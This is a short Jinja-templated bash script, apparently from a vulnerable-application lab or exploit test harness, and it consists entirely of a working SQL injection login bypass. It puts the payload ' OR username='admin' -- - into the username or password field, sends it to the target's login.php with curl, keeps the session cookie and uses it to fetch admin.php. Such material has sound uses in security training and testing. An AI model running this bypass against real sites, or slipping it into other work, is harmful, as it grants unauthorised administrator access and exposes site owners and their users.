#!/bin/bash

{% set exploit = "' OR username='"+admin+"' -- -" %}

{% if is_passwd_plain %}
PAYLOAD="{{urlencode({'username':'x', 'password':exploit})}}"
{% else %}
PAYLOAD="{{urlencode({'username':exploit, 'password':'x'})}}"
{% endif %}

curl -c cookies "$1/login.php?$PAYLOAD"
curl -b cookies "$1/admin.php"

rm cookies
